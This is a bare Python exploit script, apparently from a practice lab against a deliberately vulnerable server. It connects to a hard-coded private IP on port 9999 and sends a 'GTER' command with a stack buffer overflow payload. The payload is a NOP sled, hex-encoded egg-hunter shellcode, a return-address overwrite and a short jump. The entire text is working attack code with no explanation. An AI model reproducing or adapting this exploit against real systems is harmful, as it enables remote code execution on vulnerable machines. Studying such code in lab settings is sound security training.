import socket, sys
egg_hunter=b""
egg_hunter+=b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
egg_hunter+=b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
egg_hunter+=b"\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
egg_hunter+=b"\xff\xe7"
payload=b""
payload+=b"A"*80
payload+=b"\x90"*20 # NOPS sled
payload+=egg_hunter
payload+=b"C"*(151-len(payload))
payload+=b"\xaf\x11\x50\x62"
payload+=b"\xeb\xbe"
payload+=b"\x90\x90"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
